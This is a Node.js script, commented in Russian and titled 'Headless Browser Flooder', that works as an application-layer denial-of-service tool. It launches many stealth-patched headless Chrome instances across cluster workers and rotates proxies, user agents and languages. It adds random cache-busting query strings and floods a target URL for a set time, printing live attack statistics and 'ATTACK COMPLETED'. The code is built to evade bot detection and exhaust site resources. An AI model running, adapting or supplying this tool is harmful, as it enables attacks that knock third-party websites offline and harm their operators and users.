const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { executablePath } = require('puppeteer');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

puppeteer.use(StealthPlugin());

// ============================================
// УТИЛИТЫ
// ============================================
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomIntn(min, max) {
    return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
    return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// ============================================
// КОНФИГУРАЦИЯ
// ============================================
if (process.argv.length < 3) {
    console.log('\n❌ Использование: node script.js <target> [proxy-file] [threads] [requests-per-browser] [delay-ms] [time-sec]');
    console.log('📝 Примеры:');
    console.log('   Без прокси:  node script.js https://example.com');
    console.log('   С прокси:    node script.js https://example.com proxies.txt 4 50 100 60');
    console.log('   С --path:    node script.js https://example.com proxies.txt 4 50 100 60 --path\n');
    process.exit(1);
}

const config = {
    target: process.argv[2],
    proxyFile: process.argv[3] || null,
    threads: parseInt(process.argv[4]) || 2,
    requestsPerBrowser: parseInt(process.argv[5]) || 30,
    delay: parseInt(process.argv[6]) || 100,
    time: parseInt(process.argv[7]) || 60,
    pathFlag: process.argv.includes('--path'),
    maxProxyRetries: 3 // Максимум попыток на один прокси
};

let proxies = [];
let useProxy = false;

if (config.proxyFile) {
    try {
        proxies = readLines(config.proxyFile);
        if (proxies.length === 0) {
            console.log('⚠️  Proxy file is empty, running without proxy');
        } else {
            useProxy = true;
        }
    } catch (error) {
        console.log(`⚠️  Error reading proxy file: ${error.message}, running without proxy`);
    }
}

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

const languages = ["en-US", "en-GB", "en", "de", "fr", "es", "pt-BR", "it", "ru", "ja"];

// ============================================
// SHARED STATS
// ============================================
let sharedStats = {
    totalRequests: 0,
    successRequests: 0,
    failedRequests: 0,
    blockedRequests: 0,
    proxyErrors: 0,
    startTime: Date.now()
};

// ============================================
// ГЕНЕРАЦИЯ URL
// ============================================
function generateUrl() {
    const parsedTarget = new URL(config.target);
    let path = parsedTarget.pathname || '/';
    
    if (config.pathFlag) {
        const randQuery = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        path = path + randQuery;
    } else {
        const randQuery = `_cb=${Date.now()}_${randomString(8)}`;
        path = path + (path.includes('?') ? '&' : '?') + randQuery;
    }
    
    return `${parsedTarget.protocol}//${parsedTarget.host}${path}`;
}

// ============================================
// BROWSER LAUNCHER
// ============================================
async function createBrowser(proxyUrl = null) {
    const launchOptions = {
        headless: 'new',
        executablePath: executablePath(),
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--window-size=1920x1080',
            '--disable-blink-features=AutomationControlled',
            '--disable-web-security'
        ],
        ignoreHTTPSErrors: true,
        timeout: 30000
    };
    
    if (proxyUrl) {
        launchOptions.args.push(`--proxy-server=${proxyUrl}`);
    }
    
    const browser = await puppeteer.launch(launchOptions);
    return browser;
}

// ============================================
// FLOOD FUNCTION
// ============================================
async function floodWithBrowser(browserId) {
    let successfulRequests = 0;
    let proxyRetries = 0;
    
    while (Date.now() - sharedStats.startTime < config.time * 1000 && proxyRetries < config.maxProxyRetries) {
        let browser = null;
        const proxyUrl = useProxy ? randomElement(proxies) : null;
        
        try {
            if (proxyUrl) {
                console.log(`🌐 Browser ${browserId}: Trying proxy ${proxyUrl.substring(0, 30)}...`);
            }
            
            browser = await createBrowser(proxyUrl);
            const page = await browser.newPage();
            
            await page.setUserAgent(randomElement(useragents));
            await page.setViewport({ 
                width: randomIntn(1366, 1920), 
                height: randomIntn(768, 1080) 
            });
            
            await page.setExtraHTTPHeaders({
                'Accept-Language': randomElement(languages),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            });
            
            // Первый запрос
            const initialResponse = await page.goto(config.target, {
                waitUntil: 'domcontentloaded',
                timeout: 15000
            });
            
            const statusCode = initialResponse.status();
            
            if (statusCode === 403) {
                console.log(`🛡️  Browser ${browserId}: Blocked (403)`);
                sharedStats.blockedRequests++;
                await browser.close();
                proxyRetries++;
                continue;
            }
            
            if (statusCode >= 200 && statusCode < 400) {
                console.log(`✅ Browser ${browserId}: Connected! Starting flood...`);
                sharedStats.successRequests++;
                proxyRetries = 0; // Сброс счетчика, прокси работает
                
                // Флудим
                for (let i = 0; i < config.requestsPerBrowser; i++) {
                    if (Date.now() - sharedStats.startTime >= config.time * 1000) {
                        break;
                    }
                    
                    try {
                        const targetUrl = generateUrl();
                        const response = await page.goto(targetUrl, {
                            waitUntil: 'domcontentloaded',
                            timeout: 8000
                        });
                        
                        const status = response.status();
                        sharedStats.totalRequests++;
                        
                        if (status >= 200 && status < 400) {
                            sharedStats.successRequests++;
                            successfulRequests++;
                        } else if (status === 403) {
                            sharedStats.blockedRequests++;
                        } else {
                            sharedStats.failedRequests++;
                        }
                        
                        if (config.delay > 0) {
                            await new Promise(resolve => setTimeout(resolve, config.delay));
                        }
                        
                    } catch (reqError) {
                        sharedStats.failedRequests++;
                        sharedStats.totalRequests++;
                    }
                }
                
                // Успешно завершили цикл
                await browser.close();
                break; // Выходим из while
                
            } else {
                sharedStats.failedRequests++;
                await browser.close();
                proxyRetries++;
            }
            
        } catch (error) {
            if (browser) await browser.close();
            
            if (error.message.includes('ERR_PROXY') || 
                error.message.includes('ERR_TUNNEL') ||
                error.message.includes('net::') ||
                error.message.includes('TimeoutError')) {
                
                console.log(`🔌 Browser ${browserId}: Proxy failed, retrying... (${proxyRetries + 1}/${config.maxProxyRetries})`);
                sharedStats.proxyErrors++;
                proxyRetries++;
            } else {
                console.log(`❌ Browser ${browserId}: ${error.message.substring(0, 50)}`);
                sharedStats.failedRequests++;
                break;
            }
        }
    }
    
    console.log(`🏁 Browser ${browserId}: Finished with ${successfulRequests} successful requests`);
}

// ============================================
// STATS DISPLAY
// ============================================
function displayStats() {
    const elapsed = ((Date.now() - sharedStats.startTime) / 1000).toFixed(1);
    const rps = elapsed > 0 ? (sharedStats.totalRequests / elapsed).toFixed(2) : 0;
    const progress = Math.min((parseFloat(elapsed) / config.time) * 100, 100);
    
    console.clear();
    console.log('\n╔═══════════════════════════════════════════════════════════════╗');
    console.log('║      🚀 HEADLESS BROWSER FLOODER - LIVE STATS                ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log(`║ 🎯 Target:      ${config.target.substring(0, 43).padEnd(43)} ║`);
    console.log(`║ 🌐 Proxy Mode:  ${(useProxy ? `Enabled (${proxies.length} proxies)` : 'Disabled').padEnd(43)} ║`);
    console.log(`║ ⏱️  Runtime:     ${elapsed}s / ${config.time}s`.padEnd(64) + '║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log(`║ 📊 Total:       ${sharedStats.totalRequests.toLocaleString().padEnd(43)} ║`);
    console.log(`║ ✅ Success:     ${sharedStats.successRequests.toLocaleString().padEnd(43)} ║`);
    console.log(`║ ❌ Failed:      ${sharedStats.failedRequests.toLocaleString().padEnd(43)} ║`);
    console.log(`║ 🛡️  Blocked:     ${sharedStats.blockedRequests.toLocaleString().padEnd(43)} ║`);
    console.log(`║ 🔌 Proxy Err:   ${sharedStats.proxyErrors.toLocaleString().padEnd(43)} ║`);
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log(`║ 📈 Average RPS: ${rps.padEnd(43)} ║`);
    console.log('╚═══════════════════════════════════════════════════════════════╝\n');
    
    const filled = Math.floor(progress / 2);
    const empty = 50 - filled;
    const progressBar = '█'.repeat(filled) + '░'.repeat(empty);
    console.log(`Progress: [${progressBar}] ${progress.toFixed(1)}%\n`);
}

// ============================================
// CLUSTER
// ============================================
if (cluster.isMaster) {
    console.clear();
    console.log('\n╔═══════════════════════════════════════════════════════════════╗');
    console.log('║         🚀 HEADLESS BROWSER FLOODER - STARTING...            ║');
    console.log('╚═══════════════════════════════════════════════════════════════╝\n');
    console.log(`📋 Configuration:`);
    console.log(`   Target:            ${config.target}`);
    console.log(`   Proxy Mode:        ${useProxy ? `Enabled (${proxies.length} proxies)` : 'Disabled'}`);
    console.log(`   Threads:           ${config.threads}`);
    console.log(`   Requests/Browser:  ${config.requestsPerBrowser}`);
    console.log(`   Delay:             ${config.delay}ms`);
    console.log(`   Duration:          ${config.time}s`);
    console.log(`   Cache Bypass:      ${config.pathFlag ? 'Path Mode' : 'Query Mode'}`);
    console.log(`\n🔄 Starting ${config.threads} worker threads...\n`);
    
    for (let i = 0; i < config.threads; i++) {
        cluster.fork();
    }
    
    const statsInterval = setInterval(displayStats, 1000);
    
    cluster.on('exit', (worker) => {
        console.log(`⚠️  Worker ${worker.id} finished`);
    });
    
    setTimeout(() => {
        clearInterval(statsInterval);
        
        console.log('\n\n╔═══════════════════════════════════════════════════════════════╗');
        console.log('║                    ⏹️  ATTACK COMPLETED                       ║');
        console.log('╚═══════════════════════════════════════════════════════════════╝\n');
        
        const successRate = sharedStats.totalRequests > 0 
            ? ((sharedStats.successRequests / sharedStats.totalRequests) * 100).toFixed(2) 
            : 0;
        
        console.log('📊 Final Statistics:');
        console.log(`   Total Requests:    ${sharedStats.totalRequests.toLocaleString()}`);
        console.log(`   Successful:        ${sharedStats.successRequests.toLocaleString()}`);
        console.log(`   Failed:            ${sharedStats.failedRequests.toLocaleString()}`);
        console.log(`   Blocked:           ${sharedStats.blockedRequests.toLocaleString()}`);
        console.log(`   Proxy Errors:      ${sharedStats.proxyErrors.toLocaleString()}`);
        console.log(`   Success Rate:      ${successRate}%`);
        console.log(`   Runtime:           ${((Date.now() - sharedStats.startTime) / 1000).toFixed(1)}s\n`);
        
        process.exit(0);
    }, config.time * 1000);
    
} else {
    (async () => {
        await floodWithBrowser(cluster.worker.id);
        process.exit(0);
    })();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
